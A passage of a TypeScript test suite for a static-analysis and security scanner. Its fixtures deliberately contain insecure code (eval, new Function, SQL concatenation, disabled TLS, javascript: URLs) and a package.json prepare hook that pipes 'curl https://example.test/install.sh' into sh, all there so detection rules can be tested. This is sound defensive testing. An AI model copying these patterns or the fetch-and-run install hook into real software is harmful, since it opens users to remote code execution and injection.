  const todoFindings = report.findings.filter((finding) => finding.ruleId === "docs.todo-without-tracking");
  assert.equal(todoFindings.length, 1);
  assert.equal(todoFindings[0]?.line, 8);
});

test("comment quality requires rationale for non-TypeScript suppressions", () => {
  const report = analyseFixture(`/**
 * Exercises suppression rationale checks.
 */
// eslint-disable-next-line no-console
console.log("debug");
// biome-ignore lint/suspicious/noExplicitAny: because the generated fixture uses any.
const ok: any = {};
// ${TS_IGNORE_DIRECTIVE}
const narrowed = ok.value;
`);
  const suppressionFindings = report.findings.filter((finding) => finding.ruleId === "docs.suppression-without-rationale");
  assert.equal(suppressionFindings.length, 1);
  assert.match(suppressionFindings[0]?.message ?? "", /eslint-disable-next-line/);
  assert.equal(report.findings.some((finding) => finding.ruleId === "modernisation.ts-comment-without-rationale"), true);
});

test("comment quality restates signature through useless-docblock without duplicates", () => {
  const report = analyseFixture(`/**
 * Exercises restating comments.
 */
/** Parses diagnostics. */
function parseDiagnostics(): void {}

// DiagnosticSourceFile interface
interface DiagnosticSourceFile {
  displayPath: string;
}

// Parser options contract must stay deterministic for callers.
interface ParserOptions {
  stable: boolean;
}

/** updateName */
export function updateName(name: string): string {
  return name;
}
`);
  const uselessFindings = report.findings.filter((finding) => finding.ruleId === "docs.useless-docblock");
  assert.equal(uselessFindings.some((finding) => finding.symbol === "parseDiagnostics"), true);
  assert.equal(uselessFindings.some((finding) => finding.symbol === "DiagnosticSourceFile"), true);
  assert.equal(uselessFindings.filter((finding) => finding.symbol === "updateName").length, 1);
  assert.equal(uselessFindings.some((finding) => finding.symbol === "ParserOptions"), false);
});

test("documentation context detector matrix covers why side-effect error-behavior invariant magic-threshold", () => {
  const routingBranches = branchFixtureLines(["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k"]);
  const report = analyseFixture(`/**
 * Exercises maintainer-context documentation rules.
 */
import { spawn } from "node:child_process";
import { writeFileSync } from "node:fs";

const maxRetryLimit = 12;
const ordinaryCount = 42;
// Tuned threshold from production retry budgets.
const explainedRetryLimit = 12;
const contextText = "side effect throws schema threshold 99";
const contextTemplate = \`missing why threshold 88\`;
const contextRegex = /side-effect|invariant|77/;

/** Handles routing branches. */
function complexFlow(value: string): string {
${routingBranches}
  return value;
}

/** Complex flow exists because legacy states arrive out of order. */
function complexFlowWithWhy(value: string): string {
${routingBranches}
  return value;
}

/** Saves output. */
function persistOutput(path: string): void {
  writeFileSync(path, "ok");
}

/** Filesystem writes persist the generated report. */
function persistOutputWithContext(path: string): void {
  writeFileSync(path, "ok");
}

/** Parses user value. */
function parseRequired(value: string): string {
  if (!value) {
    throw new Error("missing value");
  }
  return value;
}

/** Throws when the required value is absent. */
function parseRequiredWithContext(value: string): string {
  if (!value) {
    throw new Error("missing value");
  }
  return value;
}

/** Payload details. */
interface ReportEnvelope {
  schemaVersion: string;
  fingerprint: string;
}

/** Schema contract must stay stable for report readers. */
interface StableReportEnvelope {
  schemaVersion: string;
  fingerprint: string;
}

/** Restating complex flow. */
function restatingComplexFlow(value: string): string {
${routingBranches}
  return value;
}

function undocumentedSideEffect(path: string): void {
  writeFileSync(path, "ok");
  spawn("node", []);
}
`);
  const findingsByRule = new Map<string, Set<string>>();
  for (const finding of report.findings) {
    const symbols = findingsByRule.get(finding.ruleId) ?? new Set<string>();
    symbols.add(finding.symbol ?? String(finding.metadata.thresholdKind ?? "-"));
    findingsByRule.set(finding.ruleId, symbols);
  }

  for (const [ruleId, symbol, expected] of documentationContextExpectations()) {
    assert.equal(findingsByRule.get(ruleId)?.has(symbol), expected, `${ruleId} ${symbol}`);
  }
});

/** Generates repeated branch lines without making the outer test look complex. */
function branchFixtureLines(values: string[]): string {
  return values.map((value) => `  if (value === "${value}") return "${value}";`).join("\n");
}

/** Lists expected documentation findings so the matrix test stays branch-light. */
function documentationContextExpectations(): Array<[string, string, boolean]> {
  return [
    ["docs.missing-why-for-complex-code", "complexFlow", true],
    ["docs.missing-why-for-complex-code", "complexFlowWithWhy", false],
    ["docs.missing-side-effect-doc", "persistOutput", true],
    ["docs.missing-side-effect-doc", "persistOutputWithContext", false],
    ["docs.missing-error-behavior-doc", "parseRequired", true],
    ["docs.missing-error-behavior-doc", "parseRequiredWithContext", false],
    ["docs.missing-invariant-doc", "ReportEnvelope", true],
    ["docs.missing-invariant-doc", "StableReportEnvelope", false],
    ["docs.magic-threshold-without-rationale", "maxRetryLimit", true],
    ["docs.magic-threshold-without-rationale", "explainedRetryLimit", false],
    ["docs.missing-side-effect-doc", "undocumentedSideEffect", false],
    ["docs.missing-function-doc", "undocumentedSideEffect", true],
    ["docs.useless-docblock", "restatingComplexFlow", true],
    ["docs.missing-why-for-complex-code", "restatingComplexFlow", false],
  ];
}

// Fixture covers source-literal detection and fingerprint stability without private helper access.
test("fixture purpose detector matrix", () => {
  const source = [
    "const report = analyseFixture(`",
    ...largeFixtureSourceLines("matrixValue"),
    "`);",
    "",
    "const shortExample = `const tiny = 1;`;",
    "const PROSE_FIXTURE_SOURCE = `",
    ...Array.from({ length: 13 }, (_, index) => `Plain prose line ${index} for a release note.`),
    "`;",
    "const uiCopy = `",
    ...Array.from({ length: 13 }, (_, index) => `Button label ${index}: Save changes`),
    "`;",
    "const markdownSnippet = `",
    ...Array.from({ length: 13 }, (_, index) => `- Item ${index}: documentation text`),
    "`;",
    "const snapshotText = `",
    ...Array.from({ length: 13 }, (_, index) => `<div data-index=\"${index}\">snapshot</div>`),
    "`;",
    "// fixture covers parser branch detection.",
    "const PARSER_FIXTURE_SOURCE = `",
    ...largeFixtureSourceLines("parserValue"),
    "`;",
    "const ROUTE_FIXTURE_SOURCE = `",
    ...largeFixtureSourceLines("routeValue"),
    "`;",
    "// fixture covers generated source for a rule-count regression.",
    "const generatedFixtureSource = Array.from({ length: 13 }, (_value, index) => \"const generated\" + index + \" = \" + index + \";\").join(\"\\n\");",
    "const generatedWithoutPurposeFixtureSource = Array.from({ length: 13 }, (_value, index) => \"const generatedMissing\" + index + \" = \" + index + \";\").join(\"\\n\");",
  ].join("\n");
  const report = analyseFixture(source, { fileName: "fixture-purpose.test.ts" });
  const findings = report.findings.filter((finding) => finding.ruleId === "docs.fixture-purpose-missing");
  const symbols = new Set(findings.map((finding) => finding.symbol));

  assert.equal(symbols.has("analyseFixture"), true);
  assert.equal(symbols.has("ROUTE_FIXTURE_SOURCE"), true);
  assert.equal(symbols.has("generatedWithoutPurposeFixtureSource"), true);
  assert.equal(symbols.has("PARSER_FIXTURE_SOURCE"), false);
  assert.equal(symbols.has("PROSE_FIXTURE_SOURCE"), false);
  assert.equal(findings.length, 3);
  assert.equal(findings.every((finding) => Number(finding.metadata.fixtureLines) > 12), true);

  const changedBodyReport = analyseFixture(["const report = analyseFixture(`", ...largeFixtureSourceLines("changedMatrixValue"), "`);"].join("\n"), { fileName: "fixture-purpose.test.ts" });
  const originalInline = findings.find((finding) => finding.symbol === "analyseFixture");
  const changedInline = changedBodyReport.findings.find((finding) => finding.ruleId === "docs.fixture-purpose-missing" && finding.symbol === "analyseFixture");
  assert.equal(changedInline?.fingerprint, originalInline?.fingerprint);
});

// Fixture covers setup-block detection and stable fixture-purpose fingerprints.
test("fixture purpose flags large fixture-heavy test setup without flagging documented setup", () => {
  const source = [
    "test(\"builds noisy fixture setup\", () => {",
    ...Array.from({ length: 13 }, (_, index) => `  const fixtureValue${index} = ${index};`),
    "  const report = analyseProject({ \"bad.ts\": \"const value = 1;\" });",
    "  assert.ok(report);",
    "});",
    "",
    "// fixture covers setup-bloat calibration.",
    "test(\"builds documented fixture setup\", () => {",
    ...Array.from({ length: 13 }, (_, index) => `  const documentedFixtureValue${index} = ${index};`),
    "  const report = analyseProject({ \"bad.ts\": \"const value = 1;\" });",
    "  assert.ok(report);",
    "});",
  ].join("\n");
  const report = analyseFixture(source, { fileName: "fixture-purpose.test.ts" });
  const fixturePurposeFindings = report.findings.filter((finding) => finding.ruleId === "docs.fixture-purpose-missing");
  assert.equal(fixturePurposeFindings.some((finding) => finding.symbol === "builds noisy fixture setup"), true);
  assert.equal(fixturePurposeFindings.some((finding) => finding.symbol === "builds documented fixture setup"), false);
});

test("comment rules config disable keeps fixture purpose independent", () => {
  const source = [
    "const report = analyseFixture(`",
    ...largeFixtureSourceLines("disableValue"),
    "`);",
    "",
    "function undocumentedHelper(): void {}",
  ].join("\n");
  const defaultReport = analyseFixture(source, { fileName: "fixture-purpose.test.ts" });
  assert.equal(defaultReport.findings.some((finding) => finding.ruleId === "docs.fixture-purpose-missing"), true);
  assert.equal(defaultReport.findings.some((finding) => finding.ruleId === "docs.missing-function-doc" && finding.symbol === "undocumentedHelper"), true);

  const disabledReport = analyseFixture(source, {
    fileName: "fixture-purpose.test.ts",
    config: { rules: { "docs.fixture-purpose-missing": { enabled: false } } },
  });
  assert.equal(disabledReport.findings.some((finding) => finding.ruleId === "docs.fixture-purpose-missing"), false);
  assert.equal(disabledReport.findings.some((finding) => finding.ruleId === "docs.missing-function-doc" && finding.symbol === "undocumentedHelper"), true);
});

test("documentation catalogue covers comment rule pack", () => {
  const descriptors = ruleDescriptors();
  const descriptorByRuleId = new Map(descriptors.map((descriptor) => [descriptor.ruleId, descriptor]));
  const configSource = readFileSync(".gruff-ts.yaml", "utf8");
  const coverageIds = ruleCatalogueCoverageRuleIds();
  const doctrineIds: Set<string> = new Set(riskyRuleQualityDoctrine.filter((entry) => entry.expectedPillar === "documentation").map((entry) => entry.ruleId));
  const documentationRuleIds = descriptors.filter((descriptor) => descriptor.pillar === "documentation").map((descriptor) => descriptor.ruleId);

  for (const ruleId of documentationRuleIds) {
    assert.notEqual(descriptorByRuleId.get(ruleId), undefined, `missing descriptor for ${ruleId}`);
    assert.equal(configSource.includes(`  ${ruleId}:`), true, `missing config entry for ${ruleId}`);
    assert.equal(coverageIds.has(ruleId), true, `missing cumulative fixture coverage for ${ruleId}`);
  }
  for (const ruleId of riskyRuleIdsRequiringNoisyValidProof.filter((ruleId) => ruleId.startsWith("docs."))) {
    assert.equal(doctrineIds.has(ruleId), true, `missing documentation doctrine for ${ruleId}`);
  }
});

test("missing public docs are reported once per exported class type or enum", () => {
  const report = analyseFixture(`export class PublicLoader {
  loadValue(): string {
    return "ok";
  }
}

export type PublicValue = string;

export enum PublicMode {
  Ready = "ready",
}

export function loadValue(): string {
  return "ok";
}
`);
  assert.equal(report.findings.filter((finding) => finding.ruleId === "docs.missing-public-doc" && finding.symbol === "PublicLoader").length, 1);
  assert.equal(report.findings.filter((finding) => finding.ruleId === "docs.missing-public-doc" && finding.symbol === "PublicValue").length, 1);
  assert.equal(report.findings.filter((finding) => finding.ruleId === "docs.missing-public-doc" && finding.symbol === "PublicMode").length, 1);
  assert.equal(report.findings.some((finding) => finding.ruleId === "docs.missing-public-doc" && finding.symbol === "loadValue"), false);
  assert.equal(report.findings.some((finding) => finding.ruleId === "docs.missing-function-doc" && finding.symbol === "loadValue"), true);
});

test("size file-length skips generated lockfiles", () => {
  const lockfile = Array.from({ length: 900 }, (_, index) => `"entry-${index}": "value"`).join("\n");
  const report = analyseProject({ "package-lock.json": lockfile });
  assert.equal(report.findings.some((finding) => finding.ruleId === "size.file-length" && finding.filePath === "package-lock.json"), false);
});

test("risk expansion redacts sensitive data in all render formats", () => {
  const apiToken = API_TOKEN_FIXTURE_VALUE;
  const databaseUrl = DATABASE_URL_FIXTURE_VALUE;
  const openAiKey = OPENAI_KEY_FIXTURE_VALUE;
  const ssn = SSN_FIXTURE_VALUE;
  const report = analyseFixture(
    `API_TOKEN=${apiToken}
DATABASE_URL=${databaseUrl}
OPENAI_API_KEY=${openAiKey}
PATIENT_SSN=${ssn}
`,
    { fileName: ".env" },
  );

  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "sensitive-data.hardcoded-env-value",
    "sensitive-data.api-key-pattern",
    "sensitive-data.database-url-password",
    "sensitive-data.pii-pattern",
  ]) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }

  for (const format of ["text", "json", "markdown", "github", "html", "sarif"] as const) {
    const rendered = renderReport(report, format);
    for (const secret of [apiToken, databaseUrl, openAiKey, ssn]) {
      assert.equal(rendered.includes(secret), false, `${format} leaked ${secret}`);
    }
    assert.match(rendered, /redacted/);
  }
});

test("risk expansion respects sensitive-data config", () => {
  // Config contract: sensitive-data.hardcoded-env-value | threshold minLength |
  // default 16 | metadata keyName,preview,length | disabled and override fixtures below.
  const source = `API_TOKEN=qR8vT3mK6pL9xS2nD4eG
`;
  const defaultReport = analyseFixture(source, { fileName: ".env" });
  assert.equal(defaultReport.findings.some((finding) => finding.ruleId === "sensitive-data.hardcoded-env-value"), true);

  const disabledReport = analyseFixture(source, {
    fileName: ".env",
    config: { rules: { "sensitive-data.hardcoded-env-value": { enabled: false } } },
  });
  assert.equal(disabledReport.findings.some((finding) => finding.ruleId === "sensitive-data.hardcoded-env-value"), false);

  const thresholdReport = analyseFixture(source, {
    fileName: ".env",
    config: { rules: { "sensitive-data.hardcoded-env-value": { threshold: 40, severity: "error" } } },
  });
  assert.equal(thresholdReport.findings.some((finding) => finding.ruleId === "sensitive-data.hardcoded-env-value"), false);
});

test("risk expansion ignores package integrity hashes", () => {
  const report = analyseFixture(
    `{
  "packages": {
    "": {
      "integrity": "sha512-Zx7pQ9vLm3N8sT2rY6wK1dF4gH5jC0bR2mN5pQ8sR1tV4xY7zA0bC3dE6fG9hI2jK5lM8nO1pQ4rS7tU0vW3xY6zA9bC2dE5fG8h=="
    }
  }
}
`,
    { fileName: "package-lock.json" },
  );
  assert.equal(report.findings.some((finding) => finding.ruleId === "sensitive-data.high-entropy-string"), false);
});

test("risk expansion finds security rules with safe non-candidates", () => {
  const report = analyseFixture(`import { createHash } from "node:crypto";
import { spawn } from "node:child_process";

function unsafe(userInput: string, userId: string): void {
  new Function(userInput)();
  setTimeout("alert(1)", 10);
  window.setInterval("alert(1)", 10);
  execScript("alert(1)");
  spawn(userInput, []);
  Math.random();
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
  const insecureAgent = { rejectUnauthorized: false, minVersion: "TLSv1" };
  location.href = "javascript:alert(1)";
  element.dangerouslySetInnerHTML = { __html: userInput };
  element.__proto__ = {};
  element["__proto__"] = {};
  db.query("SELECT * FROM users WHERE id = " + userId);
  createHash("sha1").update(userInput);
  void insecureAgent;
}

function safe(userId: string): void {
  const docs = "new Function(userInput)";
  const urlText = "xjavascript:alert(1)";
  const urlDocs = "javascript: URL literal can execute script.";
  const protoText = "__proto__";
  const secureAgent = { rejectUnauthorized: true, minVersion: "TLSv1.2" };
  timer.setTimeout("not global code", 10);
  setTimeout(() => alert("ok"), 10);
  crypto.getRandomValues(new Uint32Array(1));
  db.query("SELECT * FROM users WHERE id = ?", [userId]);
  createHash("sha256").update(userId);
  void urlText;
  void urlDocs;
  void protoText;
  void secureAgent;
}
`);
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "security.new-function",
    "security.string-timer",
    "security.process-exec",
    "security.insecure-random",
    "security.disabled-tls-verification",
    "security.javascript-url",
    "security.inner-html",
    "security.proto-access",
    "security.sql-concatenation",
    "security.weak-crypto",
  ]) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }

  const newFunctionFindings = report.findings.filter((finding) => finding.ruleId === "security.new-function");
  assert.equal(newFunctionFindings.length, 1);
  assert.equal(report.findings.filter((finding) => finding.ruleId === "security.string-timer").length, 3);
  assert.equal(report.findings.filter((finding) => finding.ruleId === "security.javascript-url").length, 1);
  assert.equal(report.findings.filter((finding) => finding.ruleId === "security.proto-access").length, 2);
});

test("process exec exempts fixed local test harnesses but reports dynamic commands", () => {
  const report = analyseProject({
    "src/harness.test.ts": `import { spawn } from "node:child_process";

const child = spawn("./bin/gruff-ts", ["summary"]);
void child;
`,
    "src/runner.ts": `import { spawn, execFile } from "node:child_process";

function run(userCommand: string): void {
  spawn(userCommand, []);
  execFile(userCommand, []);
}
`,
  });

  const processExecFindings = report.findings.filter((finding) => finding.ruleId === "security.process-exec");
  assert.equal(processExecFindings.some((finding) => finding.filePath === "src/harness.test.ts"), false);
  assert.equal(processExecFindings.filter((finding) => finding.filePath === "src/runner.ts").length, 2);
});

test("risk expansion finds direct modernisation and waste rules with safe non-candidates", () => {
  const report = analyseFixture(`function risky(value: unknown, source: Record<string, string>): number {
  if (!!source.ready) {
    observe(source);
  }
  if (Boolean(source.ready)) {
    observe(source);
  }
  if (value == "1") {
    observe(source);
  }
  const timestamp = new Date().getTime();
  const copy = Object.assign({}, source);
  try {
    return timestamp + Object.keys(copy).length;
  } catch (error) {
    throw error;
  }
}

function safe(value: unknown, source: Record<string, string>): void {
  if (source.ready) {
    observe(source);
  }
  if (value == null) {
    observe(source);
  }
  const timestamp = Date.now();
  const copy = { ...source };
  void timestamp;
  void copy;
}

function finish(): void {
  doWork();
  return;
}
`);
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "modernisation.loose-equality",
    "modernisation.date-now-candidate",
    "modernisation.object-spread-candidate",
    "waste.redundant-boolean-cast",
    "waste.useless-catch",
    "waste.useless-return",
  ]) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }
  assert.equal(report.findings.filter((finding) => finding.ruleId === "modernisation.loose-equality").length, 1);
  assert.equal(report.findings.filter((finding) => finding.ruleId === "waste.redundant-boolean-cast").length, 2);
});

test("risk expansion finds scoped test-quality rules", () => {
  const report = analyseFixture(`import assert from "node:assert/strict";
import test from "node:test";

test("magic assertion", () => {
  const total = calculateTotal();
  expect(total).toBe(42);
});

test("mock only", () => {
  const serviceMock = vi.fn();
  serviceMock();
  expect(serviceMock).toHaveBeenCalled();
});

test("unused mock", () => {
  const unusedMock = jest.fn();
  assert.ok(true);
});

test("exception type only", () => {
  expect(() => fail()).toThrow(Error);
});

test("global mutation", () => {
  process.env.NODE_ENV = "test";
  assert.equal(process.env.NODE_ENV, "test");
});

test("snapshot only", () => {
  expect(routeOrder("new", false)).toMatchSnapshot();
});

test("no throw only", () => {
  assert.doesNotThrow(() => routeOrder("new", false));
});

test("setup bloat", () => {
  const one = buildOne();
  const two = buildTwo();
  const three = buildThree();
  const four = buildFour();
  const five = buildFive();
  const six = buildSix();
  const seven = buildSeven();
  const eight = buildEight();
  const nine = buildNine();
  const ten = buildTen();
  const eleven = buildEleven();
  const twelve = buildTwelve();
  const thirteen = buildThirteen();
  expect(one).toBeDefined();
});

test("playwright expectation", async () => {
  await expect(page.locator("h1")).toHaveText("Home");
});

test("rejects expectation", async () => {
  await assert.rejects(() => fail(), Error);
});

function testBuildsLibraryValue(): void {
  expect(1).toBe(1);
}
`);
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "test-quality.magic-number-assertion",
    "test-quality.mock-only-test",
    "test-quality.unused-mock",
    "test-quality.exception-type-only",
    "test-quality.global-state-mutation",
    "test-quality.setup-bloat",
  ]) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }
  assert.equal(report.findings.some((finding) => finding.ruleId === "test-quality.no-assertions"), false);
  assert.deepEqual(report.findings.filter((finding) => finding.pillar === "test-quality" && finding.symbol === "testBuildsLibraryValue"), []);
});

test("risk expansion respects test-quality config", () => {
  // Config contract: test-quality.setup-bloat | threshold maxSetupLines |
  // default 12 | metadata setupLines,maxSetupLines | disabled and override fixtures below.
  const source = `test("compact setup", () => {
  const one = buildOne();
  const two = buildTwo();
  const three = buildThree();
  const four = buildFour();
  expect(one).toBeDefined();
});
`;
  const defaultReport = analyseFixture(source);
  assert.equal(defaultReport.findings.some((finding) => finding.ruleId === "test-quality.setup-bloat"), false);

  const tightReport = analyseFixture(source, {
    config: { rules: { "test-quality.setup-bloat": { threshold: 3, severity: "advisory" } } },
  });
  assert.equal(tightReport.findings.some((finding) => finding.ruleId === "test-quality.setup-bloat"), true);

  const disabledReport = analyseFixture(source, {
    config: { rules: { "test-quality.setup-bloat": { enabled: false, threshold: 3, severity: "advisory" } } },
  });
  assert.equal(disabledReport.findings.some((finding) => finding.ruleId === "test-quality.setup-bloat"), false);
});

test("expanded scanner keeps pre-expansion fingerprints stable", () => {
  const report = analyseFixture(`export class Bad {
  public name = "demo";
  public process(a: boolean, b: string[], c: string, d: string, e: string, f: string, g: string, h: string): void {
    if (a) {
      eval(c);
    }
    console.log(b, d, e, f, g, h);
  }
}

test("sleeps without assertion", async () => {
  await new Promise((resolve) => setTimeout(resolve, 1));
});
`);
  const fingerprints = new Map(report.findings.map((finding) => [finding.ruleId, finding.fingerprint]));
  assert.equal(fingerprints.get("security.eval-call"), "9597745a32e48f52");
  assert.equal(fingerprints.get("size.parameter-count"), "d616356804967e11");
  assert.equal(fingerprints.get("test-quality.no-assertions"), "abc482609c475b4f");
  assert.equal(fingerprints.get("modernisation.public-property"), "c80058bf4fd46024");
});

test("baseline round trip suppresses old and new findings by identity tuple", () => {
  const projectDir = mkdtempSync(join(tmpdir(), "gruff-ts-"));
  const baselineDir = mkdtempSync(join(tmpdir(), "gruff-ts-baseline-"));
  const previous = cwd();
  try {
    writeBaselineRoundTripFixture(projectDir);
    chdir(projectDir);
    assert.equal(assertBaselineRoundTrip(baselineDir) > 0, true);
  } finally {
    chdir(previous);
    rmSync(projectDir, { recursive: true, force: true });
    rmSync(baselineDir, { recursive: true, force: true });
  }
});

/** Writes a temporary project that exercises baseline identity across current rule families. */
function writeBaselineRoundTripFixture(projectDir: string): void {
  writeFileSync(
    join(projectDir, "bad.ts"),
    `const embeddedToken = "${HIGH_ENTROPY_FIXTURE_VALUE}";

export function unsafePublicApi(input: any): any {
  // ${TS_IGNORE_DIRECTIVE}
  const user = input as unknown as { name?: string };
  return user!.name;
}

async function unsafe(userInput: string, userIds: string[]): Promise<void> {
  eval(userInput);
  new Function(userInput)();
  userIds.forEach(async (userId) => {
    await sendEmailAsync(userId);
  });
  sendEmailAsync(userIds[0]);
  try {
    await sendEmailAsync("primary");
  } catch (error) {
    // ignored
  }
  throw "dynamic failure";
}
`,
  );
  writeFileSync(
    join(projectDir, "package.json"),
    JSON.stringify({
      scripts: {
        prepare: "curl https://example.test/install.sh | sh",
      },
      dependencies: {
        "remote-tool": "git+https://github.com/example/remote-tool.git",
      },
    }),
  );
  writeFileSync(
    join(projectDir, "tsconfig.json"),
    JSON.stringify({
      compilerOptions: {
        strict: false,
        noUncheckedIndexedAccess: false,
        exactOptionalPropertyTypes: false,
      },
    }),
  );
  mkdirSync(join(projectDir, "src", "cycle"), { recursive: true });
  writeFixtureFiles(projectDir, {
    "src/cycle/a.ts": `import { fromB } from "./b";

export function fromA(): string {
  return fromB();
}
`,
    "src/cycle/b.ts": `import { fromA } from "./a";

export function fromB(): string {
  return fromA();
}
`,
  });
}

/** Verifies generated, suppressed, and mismatched baseline entries by stable fingerprint identity. */
function assertBaselineRoundTrip(baselineDir: string): number {
  const baseOptions = baselineRoundTripOptions();
  const report = analyse(baseOptions);
  assertBaselineRoundTripRuleIds(report);

  const baselinePath = join(baselineDir, "baseline.json");
  analyse({ ...baseOptions, generateBaseline: baselinePath });
  const baseline = readBaselineRoundTripFile(baselinePath);
  const entries = baseline.entries ?? [];
  const [target] = entries;
  assertBaselineEntryMetadata(baseline.schemaVersion, target);

  const suppressed = analyse({ ...baseOptions, noBaseline: false, baseline: baselinePath });
  assert.equal(suppressed.baseline?.suppressed, report.findings.length);
  assert.equal(suppressed.findings.length, 0);
  assertMismatchedBaselineEntryReportsFinding(baselineDir, "wrong-rule.json", baseline, target, (entry) => ({ ...entry, ruleId: "security.wrong-rule" }));
  assertMismatchedBaselineEntryReportsFinding(baselineDir, "wrong-file.json", baseline, target, (entry) => ({ ...entry, filePath: "other.ts" }));
  return report.findings.length;
}

/** Returns stable analysis options for baseline identity assertions. */
function baselineRoundTripOptions() {
  return {
    paths: ["."],
    noConfig: true,
    format: "json" as const,
    failOn: "none" as const,
    includeIgnored: false,
    noBaseline: true,
  };
}

/** Proves the baseline fixture still covers each representative rule family in the stable contract. */
function assertBaselineRoundTripRuleIds(report: AnalysisReport): void {
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "security.eval-call",
    "security.new-function",
    "sensitive-data.high-entropy-string",
    "modernisation.double-cast",
    "security.async-foreach",
    "waste.swallowed-catch",
    "security.remote-install-script",
    "modernisation.tsconfig-strict-disabled",
    "design.circular-import",
  ]) {
    assert.equal(ruleIds.has(ruleId), true);
  }
}

type BaselineRoundTripEntry = {
  fingerprint: string;
  ruleId: string;
  filePath: string;
  line?: number;
  symbol?: string;
  message?: string;
};

type BaselineRoundTripFile = {
  schemaVersion?: string;
  entries?: BaselineRoundTripEntry[];
};

/** Reads baseline JSON through the fixture-specific shape used by these assertions. */
function readBaselineRoundTripFile(path: string): BaselineRoundTripFile {
  return JSON.parse(readFileSync(path, "utf8")) as BaselineRoundTripFile;
}

/** Narrows the first baseline entry after checking stable identity fields. */
function assertBaselineEntryMetadata(schemaVersion: string | undefined, target: BaselineRoundTripEntry | undefined): asserts target is BaselineRoundTripEntry {
  assert.equal(schemaVersion, "gruff.baseline.v1");
  assert.ok(target);
  assert.equal(typeof target.fingerprint, "string");
  assert.equal(typeof target.ruleId, "string");
  assert.equal(typeof target.filePath, "string");
  assert.equal(typeof target.message, "string");
}

/** Confirms a changed identity tuple no longer suppresses the original finding. */
function assertMismatchedBaselineEntryReportsFinding(
  baselineDir: string,
  fileName: string,
  baseline: BaselineRoundTripFile,
  target: BaselineRoundTripEntry,
  mutateFirstEntry: (entry: BaselineRoundTripEntry) => BaselineRoundTripEntry,
): void {
  const path = join(baselineDir, fileName);
  const entries = (baseline.entries ?? []).map((entry, index) => (index === 0 ? mutateFirstEntry(entry) : entry));
  writeFileSync(path, JSON.stringify({ ...baseline, entries }));
  const report = analyse({ ...baselineRoundTripOptions(), noBaseline: false, baseline: path });
  assert.equal(report.findings.some((finding) => finding.fingerprint === target.fingerprint && finding.ruleId === target.ruleId && finding.filePath === target.filePath), true);
}

test("score report is deterministic for repeated expanded scans", () => {
  const files = {
    "alpha.ts": `export class Alpha {
  public name = "alpha";
}

function unsafe(value: string): void {
  eval(value);
  new Function(value)();
}
`,
    "beta.ts": `function route(value: string): string {
  if (value === "a") return "a";
  if (value === "b") return "b";
  if (value === "c") return "c";
  if (value === "d") return "d";
  if (value === "e") return "e";
  return "z";
}
`,
  };
  const first = analyseProject(files);
  const second = analyseProject(files);
  assert.deepEqual(first.score, second.score);
  assert.deepEqual(
    first.findings.map((finding) => [finding.filePath, finding.line, finding.ruleId, finding.fingerprint]),
    second.findings.map((finding) => [finding.filePath, finding.line, finding.ruleId, finding.fingerprint]),
  );
});

test("project architecture index finds deterministic cross-file findings", () => {
  const files = {
    "src/app/feature/controller.ts": `import { sharedValue } from "../../../shared/value";
import { startCycle } from "../cycle/a";

export function renderController(): string {
  return sharedValue + startCycle();
}
`,
    "src/app/cycle/a.ts": `import { fromB } from "./b";

export function startCycle(): string {
  return fromB();
}
`,
    "src/app/cycle/b.ts": `import { startCycle } from "./a";

export function fromB(): string {
  return startCycle();
}
`,
    "src/shared/value.ts": `export const sharedValue = "shared";
`,
    "src/large.ts": Array.from({ length: 20 }, (_, index) => `export const largeValue${index} = ${index};`).join("\n"),
  };
  const config = {
    rules: {
      "design.large-module-concentration": { threshold: 40, severity: "advisory", options: { minFiles: 4, minLines: 8 } },
    },
  };
  const first = analyseProject(files, { config });
  const second = analyseProject(files, { config });
  const ruleIds = new Set(first.findings.map((finding) => finding.ruleId));
  assert.equal(ruleIds.has("design.deep-relative-import"), true);
  assert.equal(ruleIds.has("design.circular-import"), true);
  assert.equal(ruleIds.has("design.large-module-concentration"), true);
  assert.deepEqual(
    first.findings
      .filter((finding) => finding.ruleId.startsWith("design."))
      .map((finding) => [finding.filePath, finding.line, finding.ruleId, finding.symbol, finding.fingerprint]),
    second.findings
      .filter((finding) => finding.ruleId.startsWith("design."))
      .map((finding) => [finding.filePath, finding.line, finding.ruleId, finding.symbol, finding.fingerprint]),
  );
});

test("circular import finding is stable across source iteration order", () => {
  const first = analyseProject({
    "src/cycle/a.ts": `import { fromB } from "./b";
export function fromA(): string {
  return fromB();
}
`,
    "src/cycle/b.ts": `import { fromA } from "./a";
export function fromB(): string {
  return fromA();
}
`,
  });
  const second = analyseProject({
    "src/cycle/b.ts": `import { fromA } from "./a";
export function fromB(): string {
  return fromA();
}
`,
    "src/cycle/a.ts": `import { fromB } from "./b";
export function fromA(): string {
  return fromB();
}
`,
  });
  const firstCycle = first.findings.find((finding) => finding.ruleId === "design.circular-import");
  const secondCycle = second.findings.find((finding) => finding.ruleId === "design.circular-import");
  assert.ok(firstCycle);
  assert.ok(secondCycle);
  assert.deepEqual(
    [firstCycle.filePath, firstCycle.line, firstCycle.symbol, firstCycle.fingerprint],
    [secondCycle.filePath, secondCycle.line, secondCycle.symbol, secondCycle.fingerprint],
  );
});

test("project test adequacy checks nearby coverage and shallow tests", () => {
  const report = analyseProject({
    "src/payments.ts": `export function chargeCard(): string {
  return "charged";
}
`,
    "src/users.ts": `export function renderUser(): string {
  return "user";
}
`,
    "src/users.test.ts": `import assert from "node:assert/strict";
import { renderUser } from "./users";

test("renders user", () => {
  assert.equal(renderUser(), "user");
});

test("snapshot only", () => {
  expect(renderUser()).toMatchSnapshot();
});

test("no throw only", () => {
  assert.doesNotThrow(() => renderUser());
});
`,
    "src/types.d.ts": `export interface GeneratedContract {
  id: string;
}
`,
    "fixtures/sample.ts": `export function fixtureOnly(): string {
  return "fixture";
}
`,
    "src/generated/client.ts": `export function generatedClient(): string {
  return "generated";
}
`,
  });
